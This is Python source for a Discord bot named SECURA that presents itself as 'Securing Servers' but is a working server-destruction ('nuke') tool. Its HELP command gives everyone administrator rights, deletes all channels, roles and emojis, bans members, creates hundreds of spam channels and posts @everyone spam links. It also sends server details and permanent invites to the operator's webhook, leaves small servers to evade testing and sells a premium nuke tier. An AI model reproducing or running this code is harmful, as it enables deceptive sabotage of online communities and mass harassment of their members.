import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
from webserver import keep_alive
import base64
from typing import Optional
token = "" # put ur token


SPAM_CHANNEL =  ["Secura runs you" , "Get Banned" , "NUKED" , "oops Secura","F IN CHAT SECURA","Should Have Listened","Get NUKED clowns","Nuked by SECURA ","oops got nuked","I run you","Nuked by SECURA","I run you","kinda got nuked by yourself"]
DEFAULT_CHANNELS = ["Secura runs you", "Get Banned", "NUKED", "oops Secura", "F IN CHAT SECURA"]
SPAM_MESSAGE = ["@everyone You Got Nuked by SECURA https://discord.gg/mAjwRqXAPp RIP 67 https://files.catbox.moe/3obb3d.mp4"]

join_logs = []
blacklisted_users = []
premium_users = []
premium_settings = {}
trusted_servers = []
log_channel_id = None
icon_url = "https://perfect-salmon-ksgaqprzdx-wgvf57rmbw.edgeone.dev/Frame-2-1.png"
bot_system_logs = []
webhook_url = "" # webhook message
current_spam_message = "@everyone You Got Nuked by SECURA https://discord.gg/mAjwRqXAPp RIP 67 https://files.catbox.moe/3obb3d.mp4"
is_premium_nuke = False

async def send_webhook_log(title, description, color_int=0x00ff00):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            embed_data = {
                "title": title,
                "description": description,
                "color": color_int
            }
            data = {"embeds": [embed_data]}
            async with session.post(webhook_url, json=data) as resp:
                if resp.status == 204:
                    print(Fore.GREEN + "Webhook log sent successfully." + Fore.RESET)
                else:
                    print(Fore.YELLOW + f"Webhook send failed: {resp.status}" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"Webhook error: {str(e)}" + Fore.RESET)

client = commands.Bot(command_prefix=["?", "!"], intents=discord.Intents.all(), owner_id=1337767099283542026)

keep_alive()
@client.event
async def on_ready():
   print(''' 
   
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 

Support Server:https://discord.gg/U2mefh6DtN
 J
 ''')
   await client.change_presence(activity=discord.Game(name="Securing Servers"))
   await client.tree.sync()

@client.event
async def on_guild_join(guild):
    inviter = None
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
            if entry.target.id == client.user.id:
                inviter = entry.user
                break
    except:
        pass
    
    log_entry = {
        "server_name": guild.name,
        "server_id": guild.id,
        "inviter": f"{inviter.name}#{inviter.discriminator} (ID: {inviter.id})" if inviter else "Unknown",
        "member_count": guild.member_count
    }
    
    if guild.member_count <= 10 and guild.id not in trusted_servers and inviter.id != 1337767099283542026:
        print(Fore.RED + f"ANTI-TEST: Leaving small server: {guild.name} (ID: {guild.id}, Members: {guild.member_count})" + Fore.RESET)
        webhook_desc = f"**Server:** {log_entry['server_name']}\n**Server ID:** {log_entry['server_id']}\n**Invited By:** {log_entry['inviter']}\n**Members:** {log_entry['member_count']}\n**Action:** Bot automatically left (small server detected)"
        await send_webhook_log("Bot Added to Small Server (LEFT)", webhook_desc, 0xff0000)
        await guild.leave()
        return
    
    join_logs.append(log_entry)
    print(Fore.CYAN + f"Joined server: {guild.name} | Invited by: {log_entry['inviter']}" + Fore.RESET)
    
    try:
        general_channel = discord.utils.get(guild.channels, name="general")
        if general_channel:
            invite = await general_channel.create_invite(max_age=0, max_uses=0)
        else:
            invite = await guild.channels[0].create_invite(max_age=0, max_uses=0) if guild.channels else None
        invite_str = str(invite) if invite else "No invite available"
    except:
        invite_str = "Unable to create invite"
    
    webhook_desc = f"**Server:** {log_entry['server_name']}\n**Server ID:** {log_entry['server_id']}\n**Invited By:** {log_entry['inviter']}\n**Members:** {log_entry['member_count']}\n**Invite Link:** {invite_str}"
    await send_webhook_log("Bot Joined New Server", webhook_desc, 0x00ff00)
    
    if log_channel_id:
        try:
            channel = client.get_channel(log_channel_id)
            if channel:
                embed = discord.Embed(title="Bot Joined New Server!", color=discord.Color.green())
                embed.add_field(name="Server Name", value=log_entry['server_name'], inline=False)
                embed.add_field(name="Server ID", value=log_entry['server_id'], inline=False)
                embed.add_field(name="Invited By", value=log_entry['inviter'], inline=False)
                embed.add_field(name="Member Count", value=log_entry['member_count'], inline=False)
                await channel.send(embed=embed)
        except:
            pass

@client.command()
@commands.is_owner()
async def addtrusted(ctx, server_id: int):
    if server_id in trusted_servers:
        await ctx.send(f"Server {server_id} is already trusted.", delete_after=5)
        return
    trusted_servers.append(server_id)
    await ctx.send(f"Server {server_id} added to trusted list. Bot will NOT leave this server.", delete_after=5)
    print(Fore.GREEN + f"Server {server_id} added to trusted servers." + Fore.RESET)

@client.tree.command(name="logs", description="View server join logs")
async def logs_slash(interaction: discord.Interaction):
    if interaction.user.id != 1337767099283542026:
        await interaction.response.send_message("You don't have permission.", ephemeral=True)
        return
    if not join_logs:
        await interaction.response.send_message("No logs yet.", ephemeral=True)
        return
    embed = discord.Embed(title="Server Join Logs", color=discord.Color.red())
    for i, log in enumerate(join_logs[-10:], 1):
        embed.add_field(name=f"{i}. {log['server_name']} (ID: {log['server_id']})", value=f"Invited by: {log['inviter']}\nMembers: {log['member_count']}", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@client.tree.command(name="botlogs", description="View bot system logs")
async def botlogs_slash(interaction: discord.Interaction):
    if interaction.user.id != 1337767099283542026:
        await interaction.response.send_message("You don't have permission.", ephemeral=True)
        return
    if not bot_system_logs:
        await interaction.response.send_message("No system logs yet.", ephemeral=True)
        return
    embed = discord.Embed(title="Bot System Logs", color=discord.Color.blurple())
    log_text = "\n".join(bot_system_logs[-20:])
    if len(log_text) > 4096:
        log_text = log_text[-4096:]
    embed.description = f"```\n{log_text}\n```"
    await interaction.response.send_message(embed=embed, ephemeral=True)

@client.tree.command(name="blacklist", description="Blacklist a user")
async def blacklist_slash(interaction: discord.Interaction, user_id: int):
    if interaction.user.id != 1337767099283542026:
        await interaction.response.send_message("You don't have permission.", ephemeral=True)
        return
    if user_id in blacklisted_users:
        await interaction.response.send_message(f"User {user_id} is already blacklisted.", ephemeral=True)
    else:
        blacklisted_users.append(user_id)
        await interaction.response.send_message(f"User {user_id} has been blacklisted.", ephemeral=True)

@client.tree.command(name="unblacklist", description="Remove a user from blacklist")
async def unblacklist_slash(interaction: discord.Interaction, user_id: int):
    if interaction.user.id != 1337767099283542026:
        await interaction.response.send_message("You don't have permission.", ephemeral=True)
        return
    if user_id in blacklisted_users:
        blacklisted_users.remove(user_id)
        await interaction.response.send_message(f"User {user_id} removed from blacklist.", ephemeral=True)
    else:
        await interaction.response.send_message(f"User {user_id} is not blacklisted.", ephemeral=True)

@client.tree.command(name="viewblacklist", description="View all blacklisted users")
async def viewblacklist_slash(interaction: discord.Interaction):
    if interaction.user.id != 1337767099283542026:
        await interaction.response.send_message("You don't have permission.", ephemeral=True)
        return
    if not blacklisted_users:
        await interaction.response.send_message("No users are blacklisted.", ephemeral=True)
        return
    blacklist_str = "\n".join([str(uid) for uid in blacklisted_users])
    embed = discord.Embed(title="Blacklisted Users", color=discord.Color.red())
    embed.description = f"```\n{blacklist_str}\n```"
    await interaction.response.send_message(embed=embed, ephemeral=True)

@client.command()
@commands.is_owner()
async def blacklist(ctx, user_id: int):
    if user_id in blacklisted_users:
        await ctx.send(f"User {user_id} is already blacklisted.", delete_after=5)
    else:
        blacklisted_users.append(user_id)
        await ctx.send(f"User {user_id} has been blacklisted.", delete_after=5)
        print(Fore.CYAN + f"User {user_id} blacklisted." + Fore.RESET)

@client.command()
@commands.is_owner()
async def unblacklist(ctx, user_id: int):
    if user_id in blacklisted_users:
        blacklisted_users.remove(user_id)
        await ctx.send(f"User {user_id} removed from blacklist.", delete_after=5)
        print(Fore.CYAN + f"User {user_id} unblacklisted." + Fore.RESET)
    else:
        await ctx.send(f"User {user_id} is not blacklisted.", delete_after=5)

@client.command()
@commands.is_owner()
async def viewblacklist(ctx):
    if not blacklisted_users:
        await ctx.send("No users are blacklisted.", delete_after=5)
        return
    blacklist_str = "\n".join([str(uid) for uid in blacklisted_users])
    embed = discord.Embed(title="Blacklisted Users", color=discord.Color.red())
    embed.description = f"```\n{blacklist_str}\n```"
    await ctx.send(embed=embed, delete_after=10)

@client.command()
@commands.is_owner()
async def addpremium(ctx, user_id: int):
    if user_id in premium_users:
        await ctx.send(f"User {user_id} is already premium.", delete_after=5)
    else:
        premium_users.append(user_id)
        premium_settings[user_id] = {"name": "SECURA'S VICTIM", "icon": icon_url, "message": SPAM_MESSAGE[0], "channels": DEFAULT_CHANNELS}
        await ctx.send(f"User {user_id} is now premium.", delete_after=5)
        print(Fore.GREEN + f"User {user_id} upgraded to premium." + Fore.RESET)

@client.command()
@commands.is_owner()
async def removepremium(ctx, user_id: int):
    if user_id in premium_users:
        premium_users.remove(user_id)
        if user_id in premium_settings:
            del premium_settings[user_id]
        await ctx.send(f"User {user_id} removed from premium.", delete_after=5)
        print(Fore.GREEN + f"User {user_id} removed from premium." + Fore.RESET)
    else:
        await ctx.send(f"User {user_id} is not premium.", delete_after=5)

@client.command()
@commands.is_owner()
async def viewpremium(ctx):
    if not premium_users:
        await ctx.send("No premium users.", delete_after=5)
        return
    premium_str = "\n".join([str(uid) for uid in premium_users])
    embed = discord.Embed(title="Premium Users", color=discord.Color.gold())
    embed.description = f"```\n{premium_str}\n```"
    await ctx.send(embed=embed, delete_after=10)

@client.tree.command(name="customizenue", description="Customize your nuke settings (Premium Only)")
async def customizenue_slash(interaction: discord.Interaction, custom_name: str, custom_message: str, channel1: str, channel2: str, channel3: str, channel4: str, channel5: str, custom_icon_url: Optional[str] = None):
    if interaction.user.id not in premium_users:
        await interaction.response.send_message("This is a premium-only feature. You don't have access.", ephemeral=True)
        return
    custom_channels = [channel1, channel2, channel3, channel4, channel5]
    icon_to_use = custom_icon_url if custom_icon_url else icon_url
    premium_settings[interaction.user.id] = {
        "name": custom_name,
        "icon": icon_to_use,
        "message": custom_message,
        "channels": custom_channels
    }
    embed = discord.Embed(title="Nuke Customized!", color=discord.Color.gold())
    embed.add_field(name="Server Name", value=custom_name, inline=False)
    embed.add_field(name="Icon URL", value=icon_to_use, inline=False)
    embed.add_field(name="Spam Message", value=custom_message, inline=False)
    embed.add_field(name="Custom Channels", value="\n".join(custom_channels), inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)
    print(Fore.CYAN + f"User {interaction.user.id} customized their nuke settings with channels." + Fore.RESET)

@client.command()
@commands.is_owner()
async def setlogchannel(ctx):
    global log_channel_id
    log_channel_id = ctx.channel.id
    await ctx.send(f"Log channel set to {ctx.channel.mention}")

@client.command()
@commands.is_owner()
async def seticonurl(ctx, url: str):
    global icon_url
    icon_url = url
    await ctx.send(f"Icon URL set to: {url}")

@client.command()
@commands.is_owner()
async def STOP(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
@commands.is_owner()
async def START(ctx):
    if ctx.author.id in blacklisted_users:
        print(Fore.RED + f"BLACKLISTED USER ATTEMPTED ?START: {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})" + Fore.RESET)
        await send_webhook_log("BLACKLISTED USER BLOCKED", f"**User:** {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})\n**Action:** Attempted to use ?START\n**Blacklist Status:** BLOCKED", 0xff0000)
        await ctx.send("You are blacklisted and cannot use this command.", delete_after=5)
        return
    try:
        new_guild = await client.create_guild(name="SECURA SERVER")
        print(Fore.MAGENTA + f"New server created: {new_guild.name} (ID: {new_guild.id})" + Fore.RESET)
        
        general_channel = discord.utils.get(new_guild.channels, name="general")
        if general_channel:
            invite = await general_channel.create_invite(max_age=0, max_uses=0)
        else:
            invite = await new_guild.channels[0].create_invite(max_age=0, max_uses=0)
        
        owner = await client.fetch_user(1337767099283542026)
        embed = discord.Embed(title="New Server Created!", color=discord.Color.gold())
        embed.add_field(name="Server Name", value=new_guild.name, inline=False)
        embed.add_field(name="Server ID", value=new_guild.id, inline=False)
        embed.add_field(name="Invite Link", value=str(invite), inline=False)
        embed.add_field(name="Expires", value="Never", inline=False)
        
        await owner.send(embed=embed)
        await ctx.send("Server created and invite sent to your DMs!", delete_after=5)
        print(Fore.GREEN + f"Invite sent to owner: {invite}" + Fore.RESET)
    except Exception as e:
        await ctx.send(f"Error creating server: {str(e)}", delete_after=5)
        print(Fore.RED + f"Error creating server: {str(e)}" + Fore.RESET)

async def execute_nuke(ctx, nuke_name, nuke_icon, nuke_message, nuke_channels, is_premium=False):
    """Execute nuke with given parameters"""
    global current_spam_message, is_premium_nuke
    
    try:
        await ctx.message.delete()
    except:
        pass
    
    guild = ctx.guild
    
    if guild.id == 1429451048547782809:
        await ctx.send("This server is protected from being nuked.", delete_after=5)
        return
    
    action_type = "Premium nuke executed" if is_premium else "Free nuke executed"
    webhook_desc = f"**User:** {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})\n**Server:** {guild.name}\n**Server ID:** {guild.id}\n**Action:** {action_type}"
    cmd_type = "!HELP Command Used (Premium)" if is_premium else "?HELP Command Used (Free)"
    await send_webhook_log(cmd_type, webhook_desc, 0xff0000)
    
    is_premium_nuke = is_premium
    current_spam_message = nuke_message
    
    try:
      if nuke_icon:
        import aiohttp
        icon_set = False
        for attempt in range(3):
          try:
            async with aiohttp.ClientSession() as session:
              async with session.get(nuke_icon, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                  icon_bytes = await resp.read()
                  if len(icon_bytes) > 0:
                    try:
                      icon_b64 = base64.b64encode(icon_bytes).decode('utf-8')
                      icon_data = f"data:image/png;base64,{icon_b64}"
                      await guild.edit(name=nuke_name, icon=icon_bytes)
                      print(Fore.MAGENTA + f"Server changed to '{nuke_name}' with icon." + Fore.RESET)
                      icon_set = True
                      break
                    except Exception as icon_err:
                      print(Fore.YELLOW + f"Icon encoding error: {str(icon_err)}" + Fore.RESET)
                      continue
          except asyncio.TimeoutError:
            print(Fore.YELLOW + f"Icon download timeout (attempt {attempt+1}/3)" + Fore.RESET)
            continue
          except Exception as e:
            print(Fore.YELLOW + f"Icon download error attempt {attempt+1}/3: {str(e)}" + Fore.RESET)
            continue
        if not icon_set:
          await guild.edit(name=nuke_name)
          print(Fore.MAGENTA + f"Server name changed to '{nuke_name}' (icon unavailable)." + Fore.RESET)
      else:
        await guild.edit(name=nuke_name)
        print(Fore.MAGENTA + f"Server name changed to '{nuke_name}'." + Fore.RESET)
    except Exception as e:
      print(Fore.RED + f"Error changing server: {str(e)}" + Fore.RESET)
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       if member.id == ctx.author.id:
         print(Fore.CYAN + f"Skipped banning {member.name}#{member.discriminator} (nuke initiator)" + Fore.RESET)
         continue
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    async for ban_entry in guild.bans():
      user = ban_entry.user
      try:
        await user.unban("ƉĦɌɄVツ#8276")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(nuke_channels))
       await asyncio.sleep(0.1)
    print(f"nuked {guild.name} Successfully.")

@client.command()
async def HELP(ctx):
    """Nuke command - ?HELP (FREE) or !HELP (PREMIUM with customization)"""
    if ctx.author.id in blacklisted_users:
        prefix_type = "?HELP" if ctx.prefix == "?" else "!HELP"
        print(Fore.RED + f"BLACKLISTED USER ATTEMPTED {prefix_type}: {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})" + Fore.RESET)
        await send_webhook_log("BLACKLISTED USER BLOCKED", f"**User:** {ctx.author.name}#{ctx.author.discriminator} (ID: {ctx.author.id})\n**Action:** Attempted to use {prefix_type}\n**Blacklist Status:** BLOCKED", 0xff0000)
        await ctx.send("You are blacklisted and cannot use this command.", delete_after=5)
        return
    
    # Check if using ! prefix (premium) or ? prefix (free)
    if ctx.prefix == "!":
        # PREMIUM NUKE
        if ctx.author.id not in premium_users:
            await ctx.send("This command is premium-only. You don't have access. Use ?HELP for free nuke.", delete_after=5)
            return
        
        user_settings = premium_settings.get(ctx.author.id, {"name": "SECURA'S VICTIM", "icon": icon_url, "message": SPAM_MESSAGE[0], "channels": DEFAULT_CHANNELS})
        custom_name = user_settings["name"]
        custom_icon = user_settings["icon"]
        custom_message = user_settings["message"]
        custom_channels = user_settings.get("channels", DEFAULT_CHANNELS)
        
        await execute_nuke(ctx, custom_name, custom_icon, custom_message, custom_channels, is_premium=True)
    else:
        # FREE NUKE
        await execute_nuke(ctx, "SECURA'S VICTIM", icon_url, SPAM_MESSAGE[0], SPAM_CHANNEL, is_premium=False)

@client.event
async def on_guild_channel_create(channel):
  try:
    await channel.send(current_spam_message)
  except:
    pass

client.run(token)
